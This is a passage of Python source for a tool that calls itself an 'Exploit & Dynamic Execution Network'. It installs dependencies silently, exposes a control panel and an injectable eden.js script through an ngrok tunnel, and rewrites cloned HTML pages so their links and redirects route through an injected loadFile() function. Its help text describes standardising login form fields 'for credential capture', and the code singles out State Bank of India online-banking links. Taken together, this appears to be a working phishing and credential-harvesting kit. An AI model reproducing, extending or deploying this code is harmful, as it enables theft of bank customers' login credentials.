                        requires = re.findall(r'require\([\'"]([^\'"]+)[\'"]\)', content)
                        for module in requires:
                            # Only check for npm modules that have Python equivalents
                            if module == 'ws':
                                additional_modules['websocket'] = 'websocket-client'
                            elif module == 'express':
                                additional_modules['flask'] = 'flask'
                            elif module == 'socket.io':
                                additional_modules['socketio'] = 'python-socketio'
                    
                    # Look for script tags in HTML that might indicate needed modules
                    elif file_name.endswith('.html'):
                        # Check for certain script/library usages that might need Python equivalents
                        if 'socket.io' in content:
                            additional_modules['socketio'] = 'python-socketio'
                        if 'chart.js' in content.lower():
                            additional_modules['matplotlib'] = 'matplotlib'
                        if 'jquery' in content.lower():
                            additional_modules['requests'] = 'requests'
            except Exception:
                # If we can't read the file, just continue
                pass
    
    # Check for Node.js if server.js or node.js exist
    if os.path.exists(os.path.join(os.getcwd(), 'node.js')) or os.path.exists(os.path.join(os.getcwd(), 'server.js')):
        if check_nodejs():
            # If Node.js is available, install required npm packages
            install_npm_packages()
    
    # If we have additional modules to install
    if additional_modules:
        # Check which modules are missing
        missing_modules = {}
        for module_name, package_name in additional_modules.items():
            if not is_module_installed(module_name):
                missing_modules[module_name] = package_name
        
        # If we have missing modules, install them silently
        if missing_modules:
            show_loading_bar("Installing additional dependencies", total_steps=20)
            
            # Use the same installation logic as in install_required_modules
            is_venv = False
            if platform.system() != "Windows":
                try:
                    if sys.prefix != sys.base_prefix:
                        is_venv = True
                except AttributeError:
                    pass
            
            # Install the modules
            if not is_venv and platform.system() != "Windows":
                try:
                    venv_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "venv")
                    bin_dir = os.path.join(venv_dir, "bin")
                    
                    for module_name, package_name in missing_modules.items():
                        try:
                            subprocess.run([os.path.join(bin_dir, "pip"), "install", package_name],
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                        except Exception:
                            pass
                except Exception:
                    # Fall back to regular pip
                    for module_name, package_name in missing_modules.items():
                        try:
                            subprocess.run([sys.executable, "-m", "pip", "install", package_name],
                                        stdout=subprocess.PIPE,
                                        stderr=subprocess.PIPE)
                        except Exception:
                            pass
            else:
                # Windows or already in venv
                for module_name, package_name in missing_modules.items():
                    try:
                        subprocess.run([sys.executable, "-m", "pip", "install", package_name],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
                    except Exception:
                        pass
    
    # No need to verify modules - we'll handle import errors when they occur naturally

# Run the function to check and install necessary modules
check_and_install_modules()
check_and_setup_node_ngrok()

# Now import the modules after making sure they're installed
import time
import shutil
import threading
import json
import socket
import websocket
import atexit
from colorama import Fore, Back, Style
import signal
from tqdm import tqdm
import webbrowser
from datetime import datetime
from pathlib import Path
import glob
import fnmatch
from bs4 import BeautifulSoup

# Initialize colorama
colorama.init(autoreset=True)

# We'll register the shutdown handler in the main function

# Global variables
server_status = "Stopped"
ngrok_url = None
server_mode = None  # Local or Ngrok
connected_count = 0
terminal_width = 100

# Global constants for HTML Modifier
LOAD_FILE_FUNCTION = """
 function loadFile(fileName) {
            if (window.parent && window.parent.loadFile) {
                window.parent.loadFile(fileName);
            } else if (window.opener && !window.opener.closed && window.opener.loadFile) {
                window.opener.loadFile(fileName);
            } else {
                alert('Cannot access client.html. Please make sure this page is opened from client.html');
            }
        }

"""

# Regular expressions for finding redirections in JavaScript
REDIRECT_PATTERNS = [
    # Basic redirects
    r'window\.location\.href\s*=\s*[\'"]([^\'"]*)[\'"]',
    r'window\.location\.assign\s*\(\s*[\'"]([^\'"]*)[\'"]',
    r'window\.location\.replace\s*\(\s*[\'"]([^\'"]*)[\'"]',
    r'location\.href\s*=\s*[\'"]([^\'"]*)[\'"]',
    r'location\s*=\s*[\'"]([^\'"]*)[\'"]',
    r'self\.location\s*=\s*[\'"]([^\'"]*)[\'"]',
    r'top\.location\s*=\s*[\'"]([^\'"]*)[\'"]',
    r'window\.open\s*\(\s*[\'"]([^\'"]*)[\'"]',
    r'document\.location\s*=\s*[\'"]([^\'"]*)[\'"]',
    r'document\.location\.href\s*=\s*[\'"]([^\'"]*)[\'"]',
    # Form submission with action attribute
    r'form\.action\s*=\s*[\'"]([^\'"]*)[\'"]',
    # setTimeout redirects
    r'setTimeout\s*\(\s*function\s*\(\s*\)\s*{\s*(?:window\.)?location(?:\.href)?\s*=\s*[\'"]([^\'"]*)[\'"]',
    # Click simulation
    r'a\.href\s*=\s*[\'"]([^\'"]*)[\'"].*?a\.click\(\)',
    # Direct variable assignment for redirection
    r'(?:let|var|const)\s+\w+\s*=\s*[\'"]([^\'"]*\.html)[\'"].*?(?:location|window\.location)(?:\.href)?\s*=',
]

# Add HtmlModifier class here
class HtmlModifier:
    def __init__(self):
        self.files = []
        self.redirect_elements = {}
        self.modified_count = 0
        
    def clear_screen(self):
        """Clear the terminal screen"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        print_banner()
    
    def expand_file_patterns(self, patterns):
        """Expand glob patterns to get a list of matching files"""
        files = []
        for pattern in patterns:
            # If the pattern doesn't contain a wildcard, check if it's a direct file path
            if '*' not in pattern and '?' not in pattern:
                if os.path.isfile(pattern):
                    files.append(pattern)
                continue
                
            # Otherwise, use glob to find matching files
            matches = glob.glob(pattern, recursive=True)
            for match in matches:
                if os.path.isfile(match) and match.lower().endswith('.html'):
                    files.append(match)
        
        # Remove duplicates while preserving order
        unique_files = []
        for file in files:
            if file not in unique_files:
                unique_files.append(file)
                
        return unique_files
        
    def inject_load_file_function(self, html_content):
        """Inject the loadFile function before the closing script tag"""
        # Check if the function already exists to prevent duplication
        if "function loadFile(" in html_content:
            return html_content  # Function already exists, don't add it again
        
        # Find the last script tag
        script_end_match = re.search(r'</script>\s*</body>', html_content)
        
        if script_end_match:
            # Insert our function before the closing script tag
            insertion_point = script_end_match.start()
            modified_content = html_content[:insertion_point] + LOAD_FILE_FUNCTION + html_content[insertion_point:]
            return modified_content
        
        # If no script tag found before </body>, create one
        body_end_match = re.search(r'</body>', html_content)
        if body_end_match:
            insertion_point = body_end_match.start()
            script_tag = f"<script>{LOAD_FILE_FUNCTION}</script>\n"
            modified_content = html_content[:insertion_point] + script_tag + html_content[insertion_point:]
            return modified_content
        
        # If no body tag, just append at the end before html closing
        html_end_match = re.search(r'</html>', html_content)
        if html_end_match:
            insertion_point = html_end_match.start()
            script_tag = f"<script>{LOAD_FILE_FUNCTION}</script>\n"
            modified_content = html_content[:insertion_point] + script_tag + html_content[insertion_point:]
            return modified_content
            
        # Last resort: append at the end
        return html_content + f"\n<script>{LOAD_FILE_FUNCTION}</script>"
    
    def find_redirect_elements(self, html_content, filename):
        """Find elements with redirection"""
        soup = BeautifulSoup(html_content, 'html.parser')
        redirect_elements = []
        
        # Find all <a> tags with href
        links = soup.find_all('a', href=True)
        for i, link in enumerate(links):
            href = link.get('href', '')
            if href and not href.startswith(('#', 'mailto:', 'tel:', 'javascript:void')):
                # Skip external links
                if (href.startswith('http://') or href.startswith('https://')) and \
                   not any(domain in href for domain in ['localhost', '127.0.0.1']):
                    # Check if it's a known domain that we want to handle
                    parent_domain = '.'.join(href.split('/')[2].split('.')[-2:]) if '/' in href else ''
                    if parent_domain and any(domain in parent_domain for domain in ['onlinesbi.sbi', 'bank.com', 'login.com']):
                        # Include known domains for processing
                        pass
                    else:
                        continue
                
                # Get a unique identifier for this element
                # Create an identifier based on the element's tag, attributes, and text
                element_id = f"a_{i}"
                
                # Check if this link is inside a list item
                parent_li = link.find_parent('li')
                if parent_li:
                    # Include information about the parent li in the element data
                    redirect_elements.append({
                        'type': 'link_in_li',
                        'element': str(parent_li),
                        'target': href,
                        'index': len(redirect_elements) + 1,
                        'tag': link.name,
                        'parent_tag': parent_li.name,
                        'attrs': {k: v for k, v in link.attrs.items()},
                        'parent_attrs': {k: v for k, v in parent_li.attrs.items()},
                        'inner_html': ''.join(str(c) for c in link.contents),
                        'element_id': element_id
                    })
                else:
                    redirect_elements.append({
                        'type': 'link',
                        'element': str(link),
                        'target': href,
                        'index': len(redirect_elements) + 1,
                        'tag': link.name,
                        'attrs': {k: v for k, v in link.attrs.items()},
                        'inner_html': ''.join(str(c) for c in link.contents),
                        'element_id': element_id
                    })
        
        # Find buttons with onclick redirects
        buttons = soup.find_all(['button', 'div', 'span', 'input'], onclick=True)
        for i, button in enumerate(buttons):
            onclick = button.get('onclick', '')
            for pattern in REDIRECT_PATTERNS:
                match = re.search(pattern, onclick)
                if match:
                    element_id = f"button_{i}"
                    redirect_elements.append({
                        'type': 'button',
                        'element': str(button),
                        'target': match.group(1),
                        'index': len(redirect_elements) + 1,
                        'tag': button.name,
                        'attrs': {k: v for k, v in button.attrs.items()},
                        'inner_html': ''.join(str(c) for c in button.contents),
                        'element_id': element_id
                    })
                    break
        
        # Find script tags and search for redirects in their content
        scripts = soup.find_all('script')
        for i, script in enumerate(scripts):
            if script.string:
                for pattern in REDIRECT_PATTERNS:
                    for j, match in enumerate(re.finditer(pattern, script.string)):
                        redirect_target = match.group(1)
                        element_id = f"script_{i}_{j}"
                        redirect_elements.append({
                            'type': 'script',
                            'element': f"Script redirection: {match.group(0)}",
                            'target': redirect_target,
                            'index': len(redirect_elements) + 1,
                            'script_content': script.string,
                            'match_obj': match,
                            'element_id': element_id
                        })
        
        if redirect_elements:
            self.redirect_elements[filename] = redirect_elements
        
        return redirect_elements
    
    def extract_clean_filename(self, path):
        """Extract the clean filename without query parameters or fragments."""
        # First get just the basename
        basename = os.path.basename(path)
        
        # Remove query parameters (?param=value)
        if '?' in basename:
            basename = basename.split('?')[0]
        
        # Remove fragments (#section)
        if '#' in basename:
            basename = basename.split('#')[0]
        
        return basename
    
    def modify_files(self, selections):
        """Modify the selected files with the chosen elements"""
        if selections is None:
            return
        
        self.modified_count = 0
        
        for filename, selected_indices in selections.items():
            if not selected_indices:
                print(f"{Fore.YELLOW}Skipping {filename} - no elements selected.{Style.RESET_ALL}")
                continue
                
            try:
                with open(filename, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # First inject the loadFile function if not already present
                if "function loadFile(" not in content:
                    content = self.inject_load_file_function(content)
                
                # Get the redirect elements for this file
                redirect_elements = self.redirect_elements[filename]
                
                # Create a new BeautifulSoup object with the updated content
                soup = BeautifulSoup(content, 'html.parser')
                
                # Process each selected element
                for index in selected_indices:
                    # Convert to 0-based for internal use
                    idx = index - 1
                    
                    if idx < 0 or idx >= len(redirect_elements):
                        continue
                    
                    element_info = redirect_elements[idx]
                    element_type = element_info['type']
                    
                    if element_type == 'link':
                        # Handle <a> tags by finding the link again in the soup
                        href = element_info['target']
                        
                        # Find all links with this href
                        links = soup.find_all('a', href=href)
                        
                        # Find the one that matches our element based on content
                        original_element = None
                        if len(links) == 1:
                            original_element = links[0]
                        else:
                            # If multiple links have the same href, try to match by contents or attributes
                            for link in links:
                                if str(link) == element_info['element']:
                                    original_element = link
                                    break
                        
                        if original_element:
                            # Extract clean filename without query parameters
                            target_file = self.extract_clean_filename(href)
                            
                            # Modify the href to # and add onclick handler
                            original_element['href'] = "#"
                            original_element['onclick'] = f"return loadFile('{target_file}')"
                            
                            # Add cursor pointer if not already styled
                            if 'style' in original_element.attrs:
                                if 'cursor: pointer' not in original_element['style']:
                                    original_element['style'] += '; cursor: pointer'
                            else:
                                original_element['style'] = 'cursor: pointer'
                            
                            self.modified_count += 1
                        else:
                            print(f"{Fore.YELLOW}Warning: Could not find link element for index {index} in {filename}{Style.RESET_ALL}")
                    
                    elif element_type == 'link_in_li':
                        # Handle <a> tags inside <li> elements
                        href = element_info['target']
                        
                        # Extract attributes to help identify the exact li element
                        parent_attrs = element_info['parent_attrs']
                        link_attrs = element_info['attrs']
                        
                        # Find potential li elements
                        li_elements = soup.find_all('li')
                        original_li = None
                        original_link = None
                        
                        # First try to find the exact li by attributes
                        for li in li_elements:
                            match = True
                            for key, value in parent_attrs.items():
                                if li.get(key) != value:
                                    match = False
                                    break
                            
                            if match:
                                # Found matching li, now find the link inside it
                                link = li.find('a', href=href)
                                if link:
                                    original_li = li
                                    original_link = link
                                    break
                        
                        # If not found, try a more general approach
                        if not original_link:
                            for li in li_elements:
                                link = li.find('a', href=href)
                                if link:
                                    original_li = li
                                    original_link = link
                                    break
                        
                        if original_link:
                            # Extract clean filename without query parameters
                            target_file = self.extract_clean_filename(href)
                            
                            # Modify the href to # and add onclick handler
                            original_link['href'] = "#"
                            original_link['onclick'] = f"return loadFile('{target_file}')"
                            
                            # Add cursor pointer if not already styled
                            if 'style' in original_link.attrs:
                                if 'cursor: pointer' not in original_link['style']:
                                    original_link['style'] += '; cursor: pointer'
                            else:
                                original_link['style'] = 'cursor: pointer'
                            
                            self.modified_count += 1
                        else:
                            print(f"{Fore.YELLOW}Warning: Could not find list item with link for index {index} in {filename}{Style.RESET_ALL}")
                    
                    elif element_type == 'button':
                        # Handle button elements by finding them in the soup
                        target = element_info['target']
                        onclick = None
                        for attr, value in element_info['attrs'].items():
                            if attr.lower() == 'onclick':
                                onclick = value
                                break
                        
                        if not onclick:
                            continue
                            
                        # Find buttons with this onclick
                        buttons = soup.find_all(element_info['tag'], onclick=re.compile(re.escape(onclick)))
                        
                        if buttons:
                            button = buttons[0]  # Take the first matching button
                            
                            # Extract clean filename without query parameters
                            target_file = self.extract_clean_filename(target)
                            
                            # Replace the onclick with loadFile
                            button['onclick'] = f"return loadFile('{target_file}')"
                            
                            # Add cursor pointer if not already styled
                            if 'style' in button.attrs:
                                if 'cursor: pointer' not in button['style']:
                                    button['style'] += '; cursor: pointer'
                            else:
                                button['style'] = 'cursor: pointer'
                                
                            self.modified_count += 1
                        else:
                            print(f"{Fore.YELLOW}Warning: Could not find button element for index {index} in {filename}{Style.RESET_ALL}")
                    
                    elif element_type == 'script':
                        # Handle script redirects
                        script_content = element_info['script_content']
                        match_obj = element_info['match_obj']
                        target = element_info['target']
                        
                        # Find scripts with this content
                        scripts = soup.find_all('script')
                        for script in scripts:
                            if script.string and script.string == script_content:
                                # Extract clean filename without query parameters
                                target_file = self.extract_clean_filename(target)
                                
                                # Replace the redirect with loadFile
                                new_content = script.string[:match_obj.start()] + \
                                             f"loadFile('{target_file}')" + \
                                             script.string[match_obj.end():]
                                             
                                script.string = new_content
                                self.modified_count += 1
                                break
                
                # Write the modified content back
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(str(soup))
                
                print(f"{Fore.GREEN}✓ Modified {self.modified_count} elements in {filename}{Style.RESET_ALL}")
                
            except Exception as e:
                print(f"{Fore.RED}Error modifying {filename}: {str(e)}{Style.RESET_ALL}")
        
        return self.modified_count > 0
        
    def display_redirect_elements(self):
        """Display all found redirect elements"""
        if not self.redirect_elements:
            print(f"{Fore.YELLOW}No redirect elements found in any file.{Style.RESET_ALL}")
            return 0
        
        total_elements = 0
        for filename, elements in self.redirect_elements.items():
            total_elements += len(elements)
        
        print(f"\n{Fore.GREEN}Found {total_elements} total redirect elements in {len(self.redirect_elements)} file(s).{Style.RESET_ALL}")
        
        # Use a continuous index counter across all files
        element_index = 1
        
        # Display elements by file
        file_index = 1
        for filename, elements in self.redirect_elements.items():
            print(f"\n{Fore.CYAN}File {file_index}: {filename} ({len(elements)} element(s)){Style.RESET_ALL}")
            
            for element in elements:
                element_type = element['type'].capitalize()
                target = element['target']
                
                # Store the global index in the element
                element['global_index'] = element_index
                
                print(f"{Fore.WHITE}{element_index}. [{element_type}] Target: {target} (File: {os.path.basename(filename)}){Style.RESET_ALL}")
                
                # Show a preview of the element
                element_preview = element['element']
                if len(element_preview) > 100:
                    element_preview = element_preview[:97] + "..."
                print(f"   {Fore.YELLOW}{element_preview}{Style.RESET_ALL}\n")
                
                # Increment the global index
                element_index += 1
            
            file_index += 1
        
        return element_index - 1  # Return the total number of elements
        
    def process_files(self, file_patterns):
        """Process the files matching the given patterns"""
        self.files = self.expand_file_patterns(file_patterns)
        
        if not self.files:
            print(f"{Fore.RED}No HTML files found matching the patterns.{Style.RESET_ALL}")
            return False
        
        print(f"{Fore.GREEN}Found {len(self.files)} HTML file(s):{Style.RESET_ALL}")
        for i, file in enumerate(self.files, 1):
            print(f"{i}. {file}")
        print()
        
        # Process each file to find redirects
        for file in self.files:
            try:
                with open(file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Find redirect elements
                redirect_elements = self.find_redirect_elements(content, file)
                
                if redirect_elements:
                    print(f"{Fore.CYAN}Found {len(redirect_elements)} redirect element(s) in {file}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}No redirect elements found in {file}{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}Error processing {file}: {str(e)}{Style.RESET_ALL}")
        
        # Ask if the user wants to manually select buttons
        print(f"\n{Fore.YELLOW}Do you want to manually select which elements to modify? (y/n){Style.RESET_ALL}")
        selection_input = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip().lower()
        
        if selection_input == 'n':
            # If no, automatically select all elements for all files
            selections = {}
            for filename, elements in self.redirect_elements.items():
                selections[filename] = list(range(1, len(elements) + 1))
            
            print(f"{Fore.GREEN}Automatically selecting all elements in all files.{Style.RESET_ALL}")
            self.modify_files(selections)
            return True
        elif selection_input == 'y':
            # Continue with manual selection
            return True
        else:
            print(f"{Fore.RED}Invalid input. Please enter 'y' or 'n'.{Style.RESET_ALL}")
            return False
            
    def prompt_for_selection(self):
        """Prompt the user to select elements to modify"""
        if not self.redirect_elements:
            return {}
            
        # Display elements with continuous numbering
        total_elements = self.display_redirect_elements()
        
        # Create a mapping of global indices to (filename, local_index)
        global_to_local = {}
        current_index = 1
        
        for filename, elements in self.redirect_elements.items():
            for i, element in enumerate(elements, 1):
                global_to_local[current_index] = (filename, i)
                current_index += 1
        
        # Prompt for selection using global indexing
        print(f"\n{Fore.CYAN}Select elements to modify:{Style.RESET_ALL}")
        print(f"Enter element numbers (1-{total_elements}) separated by spaces or commas.")
        print(f"Or type 'all' to select all, 'none' to select none, or 'exit' to quit.")
        
        while True:
            selection_input = input(f"{Fore.GREEN}> {Style.RESET_ALL}").strip()
            
            if selection_input.lower() == 'exit':
                return None
            elif selection_input.lower() == 'all':
                # Select all elements
                selections = {}
                for filename, elements in self.redirect_elements.items():
                    selections[filename] = list(range(1, len(elements) + 1))
                return selections
            elif selection_input.lower() == 'none':
                # Select no elements
                selections = {}
                for filename in self.redirect_elements:
                    selections[filename] = []
                return selections
            else:
                # Parse the input for numbers
                try:
                    # Replace commas with spaces and split
                    parts = selection_input.replace(',', ' ').split()
                    global_indices = []
                    
                    for part in parts:
                        if '-' in part:
                            start, end = map(int, part.split('-'))
                            global_indices.extend(range(start, end + 1))
                        else:
                            global_indices.append(int(part))
                    
                    # Filter invalid indices
                    valid_indices = [idx for idx in global_indices if 1 <= idx <= total_elements]
                    
                    if not valid_indices:
                        print(f"{Fore.RED}No valid indices selected. Please try again.{Style.RESET_ALL}")
                    else:
                        # Create selections dict based on global indices
                        selections = {}
                        for idx in valid_indices:
                            filename, local_idx = global_to_local[idx]
                            if filename not in selections:
                                selections[filename] = []
                            selections[filename].append(local_idx)
                        
                        # Make sure all files are represented in the selections
                        for filename in self.redirect_elements:
                            if filename not in selections:
                                selections[filename] = []
                        
                        return selections
                except ValueError:
                    print(f"{Fore.RED}Invalid input. Please enter numbers only.{Style.RESET_ALL}")

# Function to clear screen based on operating system
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to get terminal width
def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 100  # Default width

# Add a custom color parser function at the beginning of the file after imports
def parse_color_tags(text):
    """
    Parse color tags in the format {COLOR} and replace with Colorama colors.
    Example: "This is {RED}red text{RESET} and {BLUE}blue text{RESET}"
    """
    color_map = {
        "{BLACK}": Fore.BLACK,
        "{RED}": Fore.RED,
        "{GREEN}": Fore.GREEN,
        "{YELLOW}": Fore.YELLOW,
        "{BLUE}": Fore.BLUE,
        "{MAGENTA}": Fore.MAGENTA,
        "{CYAN}": Fore.CYAN,
        "{WHITE}": Fore.WHITE,
        "{RESET}": Fore.RESET,
        "{LIGHTBLACK}": Fore.LIGHTBLACK_EX,
        "{LIGHTRED}": Fore.LIGHTRED_EX,
        "{LIGHTGREEN}": Fore.LIGHTGREEN_EX,
        "{LIGHTYELLOW}": Fore.LIGHTYELLOW_EX,
        "{LIGHTBLUE}": Fore.LIGHTBLUE_EX,
        "{LIGHTMAGENTA}": Fore.LIGHTMAGENTA_EX,
        "{LIGHTCYAN}": Fore.LIGHTCYAN_EX,
        "{LIGHTWHITE}": Fore.LIGHTWHITE_EX
    }
    
    for tag, color in color_map.items():
        text = text.replace(tag, color)
    return text

# Function to print banner with connection count
def print_banner():
    global terminal_width, connected_count
    
    clear_screen()
    terminal_width = get_terminal_width()
    
    # Create stylish banner with colored elements - fixed width for proper alignment
    banner_lines = [
        "{CYAN}███████{WHITE}╗{CYAN}██████{WHITE}╗ {CYAN}███████{WHITE}╗{CYAN}███{WHITE}╗   {CYAN}██{WHITE}╗",
        "{CYAN}██{WHITE}╔════╝{CYAN}██{WHITE}╔══{CYAN}██{WHITE}╗{CYAN}██{WHITE}╔════╝{CYAN}████{WHITE}╗  {CYAN}██{WHITE}║",
        "{CYAN}█████{WHITE}╗  {CYAN}██{WHITE}║  {CYAN}██{WHITE}║{CYAN}█████{WHITE}╗  {CYAN}██{WHITE}╔{CYAN}██{WHITE}╗ {CYAN}██{WHITE}║",
        "{CYAN}██{WHITE}╔══╝  {CYAN}██{WHITE}║  {CYAN}██{WHITE}║{CYAN}██{WHITE}╔══╝  {CYAN}██{WHITE}║╚{CYAN}██{WHITE}╗{CYAN}██{WHITE}║",
        "{CYAN}███████{WHITE}╗{CYAN}██████{WHITE}╔╝{CYAN}███████{WHITE}╗{CYAN}██{WHITE}║ ╚{CYAN}████{WHITE}║",
        "{WHITE}╚══════╝╚═════╝ ╚══════╝╚═╝  ╚═══╝"
    ]
    
    # Parse color tags in each line
    colored_banner_lines = [parse_color_tags(line) for line in banner_lines]
    
    # Calculate required width and padding (use the first line for reference)
    clean_line = re.sub(r'\x1b\[[0-9;]*m', '', colored_banner_lines[0])
    banner_width = len(clean_line)
    center_padding = (terminal_width - banner_width) // 2
    
    # Print some spacing
    print("\n")
    
    # Print each banner line with consistent padding (using the same center_padding for all lines)
    for line in colored_banner_lines:
        print(f"{' ' * center_padding}{line}")
    
    # Print a subtle separator (space)
    print()
    
    # Subtitle lines with proper centering and coloring
    subtitle1 = "{WHITE}Exploit & Dynamic Execution Network"
    # Replace dots with a solid line in cyan color - make sure it's the same width as the banner
    subtitle2 = "{CYAN}" + "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━" 
    subtitle3 = "{GREEN}Version: 1.0     {GREEN}Linkedin: www.linkedin.com/in/varun--775a77310     {GREEN}By: Varun"
    
    # Process subtitles the same way for consistency
    subtitles = [subtitle1, subtitle2, subtitle3]
    colored_subtitles = [parse_color_tags(subtitle) for subtitle in subtitles]
    
    # Calculate the longest subtitle
    clean_subtitles = [re.sub(r'\x1b\[[0-9;]*m', '', subtitle) for subtitle in colored_subtitles]
    max_subtitle_len = max(len(subtitle) for subtitle in clean_subtitles)
    
    # If subtitles are wider than the banner, adjust center_padding
    if max_subtitle_len > banner_width:
        center_padding = (terminal_width - max_subtitle_len) // 2
    
    # Print each subtitle with consistent padding
    for i, subtitle in enumerate(colored_subtitles):
        clean_subtitle = re.sub(r'\x1b\[[0-9;]*m', '', subtitle)
        # Use specific padding for each subtitle type
        if i == 0 or i == 2:  # Title or version info
            extra_pad = (max_subtitle_len - len(clean_subtitle)) // 2
            print(f"{' ' * (center_padding + extra_pad)}{subtitle}")
        else:  # Center line
            print(f"{' ' * center_padding}{subtitle}")
    
    # Add space before status information
    print("\n")
    
    # Simple centered status information similar to setup.py
    # Calculate width for status info section
    info_width = 100
    status_padding = (terminal_width - info_width) // 2
    
    # Create a simple separator line (now white)
    separator = f"{Fore.WHITE}{'═' * info_width}"
    print(f"{' ' * status_padding}{separator}")
    
    # Format string for consistent display (similar to setup.py)
    format_str = "{:<20}: {}"
    
    # Server status line
    status_color = Fore.GREEN if server_status == "Running" else Fore.RED
    server_line = format_str.format(f"{Fore.YELLOW}Server Status", f"{status_color}{server_status}")
    print(f"{' ' * status_padding}{server_line}")
    
    # Connection line with color based on count
    if connected_count == 0:
        connection_color = Fore.RED
    elif connected_count == 1:
        connection_color = Fore.YELLOW
    else:  # 2 or more
        connection_color = Fore.GREEN
    
    connection_line = format_str.format(f"{Fore.YELLOW}Connection", f"{connection_color}{connected_count} ({connected_count} clients)")
    print(f"{' ' * status_padding}{connection_line}")
    
    # Display URLs when server is running
    if server_status == "Running":
        #print(f"{' ' * status_padding}{Fore.WHITE}{'─' * info_width}")
        
        if server_mode == "Local":
            control_panel = f"http://localhost:8080/server.html"
            print(f"{' ' * status_padding}{format_str.format(f'{Fore.YELLOW}Control Panel', f'{Fore.CYAN}{control_panel}')}")
            
            js_tag = f"<script src=\"http://localhost:8080/eden.js\"></script>"
            print(f"{' ' * status_padding}{format_str.format(f'{Fore.YELLOW}JavaScript Tag', f'{Fore.CYAN}{js_tag}')}")
            
            ws_url = f"ws://localhost:8080"
            print(f"{' ' * status_padding}{format_str.format(f'{Fore.YELLOW}WebSocket URL', f'{Fore.CYAN}{ws_url}')}")
        else:
            control_panel = f"https://{ngrok_url}/server.html"
            print(f"{' ' * status_padding}{format_str.format(f'{Fore.YELLOW}Control Panel', f'{Fore.MAGENTA}{control_panel}')}")
            
            js_tag = f"<script src=\"https://{ngrok_url}/eden.js\"></script>"
            print(f"{' ' * status_padding}{format_str.format(f'{Fore.YELLOW}JavaScript Tag', f'{Fore.MAGENTA}{js_tag}')}")
            
            ws_url = f"wss://{ngrok_url}"
            print(f"{' ' * status_padding}{format_str.format(f'{Fore.YELLOW}WebSocket URL', f'{Fore.MAGENTA}{ws_url}')}")
    
    # Bottom separator (now white)
    print(f"{' ' * status_padding}{separator}")

# Function to show syntax
def show_syntax(command=None):
    """Show detailed syntax and examples for commands"""
    syntax_info = {
        "redirect": {
            "description": "Modify HTML files to use loadFile() function for navigation",
            "syntax": "redirect <file_pattern> [<file_pattern> ...]",
            "examples": [
                "redirect *.html                 - Modify all HTML files in the current directory",
                "redirect index.html home.html   - Modify specific HTML files",
                "redirect folder/*.html          - Modify all HTML files in a specific folder",
                "redirect */home.html            - Modify all home.html files in any subdirectory"
            ],
            "notes": "This command finds redirection elements in HTML files and replaces them with loadFile() function calls."
        },
        "login": {
            "description": "Standardize form input field names for credential capture",
            "syntax": "login <file_pattern> [<file_pattern> ...]",
            "examples": [
                "login *.html                  - Standardize forms in all HTML files",
                "login index.html login.html   - Standardize forms in specific HTML files",
                "login index?.html             - Use wildcards to match multiple files"
            ],
            "notes": "This command finds forms in HTML files and renames input fields to standard names (username, password, email) that are recognized by the credential capture system."
        },
        "template": {
            "description": "Create eden HTML with embedded resources",
            "syntax": "template <html_path> [<html_path> ...]",
            "examples": [
                "template index.html           - Create eden version of index.html",
                "template page1.html page2.html - Process multiple HTML files",
                "template ./folder/page.html    - Process HTML in a subdirectory"
            ],
            "notes": "This command embeds CSS and JS inline, copies images to a resource folder, and updates image URLs. It requires an associated resource folder with the same name as the HTML file."
        },
        "master": {
            "description": "Apply all optimizations (login, redirect, template) at once",
            "syntax": "master <file_pattern> [<file_pattern> ...]",
            "examples": [
                "master *.html                 - Apply all optimizations to all HTML files",
                "master index.html login.html  - Process specific HTML files with all optimizations",
                "master folder/*.html          - Process all HTML files in a specific folder"
            ],
            "notes": "This command combines the functionality of login, redirect, and template commands. It standardizes form inputs, modifies redirects to use loadFile(), and creates eden templates with embedded resources."
        },
        "link": {
            "description": "Add eden.js script to HTML files",
            "syntax": "link <filename>",
            "examples": [
                "link index.html               - Add the eden.js script tag to index.html",
                "link ./folder/page.html       - Add the script tag to a file in a subdirectory"
            ],
            "notes": "This adds the script tag before the closing </body> tag in the HTML file."
        },
        "server": {
            "description": "Open server control panel in browser",
            "syntax": "server",
            "examples": [
                "server                        - Open the server control panel in the default browser"
            ],
            "notes": "This opens the server.html page in your default web browser."
        },
        "clear": {
            "description": "Clear the screen",
            "syntax": "clear",
            "examples": [
                "clear                         - Clear the terminal screen"
            ],
            "notes": "This clears the terminal screen and re-displays the banner."
        },
        "restart": {
            "description": "Restart setup from the beginning",
            "syntax": "restart",
            "examples": [
                "restart                       - Stop the server and restart the setup process"
            ],
            "notes": "This stops any running server and restarts the setup process."
        },
        "exit": {
            "description": "Exit the tool",
            "syntax": "exit",
            "examples": [
                "exit                          - Stop the server and exit the program"
            ],
            "notes": "This stops any running server and exits the program."
        },
        "syntax": {
            "description": "Show detailed syntax and examples for commands",
            "syntax": "syntax [command]",
            "examples": [
                "syntax                        - Show syntax for all commands",
                "syntax redirect                 - Show detailed help for the redirect command"
            ],
            "notes": "Use this command to get detailed help with examples for any command."
        }
    }
    
    if command and command in syntax_info:
        # Show detailed help for a specific command
        cmd_help = syntax_info[command]
        print(f"\n{Fore.CYAN}Command: {command}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Description:{Style.RESET_ALL} {cmd_help['description']}")
        print(f"{Fore.GREEN}Syntax:{Style.RESET_ALL} {cmd_help['syntax']}")
        
        print(f"\n{Fore.GREEN}Examples:{Style.RESET_ALL}")
        for example in cmd_help['examples']:
            print(f"  {example}")
            
        if 'notes' in cmd_help:
            print(f"\n{Fore.GREEN}Notes:{Style.RESET_ALL} {cmd_help['notes']}")
    else:
        # Show summary of all commands
        print(f"\n{Fore.CYAN}Available Commands and Syntax:{Style.RESET_ALL}")
        for cmd, info in syntax_info.items():
